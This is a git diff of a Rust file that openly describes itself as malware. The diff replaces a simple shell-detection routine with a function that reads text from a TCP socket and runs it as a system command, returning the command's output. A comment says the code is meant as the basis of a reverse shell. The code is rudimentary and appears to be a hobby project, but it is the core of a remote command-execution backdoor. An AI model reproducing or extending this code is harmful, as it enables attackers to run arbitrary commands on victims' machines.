@@ -1,33 +1,30 @@
-use std::{fs, io, process};
+use std::{
+    error::Error,
+    process::{self, Stdio},
+};
 
-fn shell(shell: &str, command: Vec<&str>) {
-    process::Command::new(shell)
-        .arg("-c")
-        .args(command.as_slice())
-        .spawn()
-        .expect("test");
-}
+use tokio::net::TcpStream;
 
-fn check_shell() -> Option<&'static str> {
-    // use POSIX compliant shells only.
-    let shfile = fs::read_to_string("/etc/shells").ok()?;
-    let shells: Vec<&str> = shfile.split("\n").collect();
-    let valid_shells = [
-        "bash", "sh", "zsh", "ksh", "dash", "nsh", "osh", "yash", "tcsh",
-    ];
-    let mut chosen_shell: Option<&str> = None;
-    for shell in valid_shells {
-        let pattern = format!("/usr/bin/{}", shell);
-        if shells.contains(&pattern.as_str()) {
-            println!("found shell: {shell}");
-            chosen_shell = Some(shell);
-            break;
-        }
+fn shell(command: &str) -> Result<Box<[u8]>, Box<dyn Error>> {
+    let mut args: Vec<&str> = command.split(" ").collect();
+    let main_arg = args[0];
+
+    if args.len() > 1 {
+        args = args.split_off(1)
     }
-    chosen_shell
+    dbg!(&args);
+    let result = process::Command::new(main_arg)
+        .args(args)
+        .stdout(Stdio::piped())
+        .output()?;
+    let stdout = String::from_utf8(result.stdout.clone());
+    let stderr = String::from_utf8(result.stderr.clone());
+    println!("{:?}", stdout);
+    println!("{:?}", stderr);
+    Ok(result.stdout.into_boxed_slice())
 }
 
-pub fn init() {
+pub async fn init(socket: TcpStream) -> Result<Box<[u8]>, Box<dyn Error>> {
     // on run... do this:
     /*
      * 1. Detect what shells are on the machine
@@ -36,11 +33,16 @@ pub fn init() {
      * 4. print a goodbye message.
      * */
     println!("Hello there, i am malware!");
-    let shellcommand = match check_shell() {
-        Some(x) => x,
-        None => "not found...",
-    };
+
     //tokio can be used to spawn a server to create a reverse shell.
-    let command = vec!["echo this malware world"];
-    shell(shellcommand, command);
+    let mut buffer = vec![0; 1024];
+    match socket.try_read(buffer.as_mut_slice()) {
+        Ok(v) => buffer.truncate(v),
+        Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => (),
+        Err(e) => eprintln!("{}", e),
+    }
+    let input = String::from_utf8(buffer)?;
+
+    let response = shell(input.trim())?;
+    Ok(response)
 }
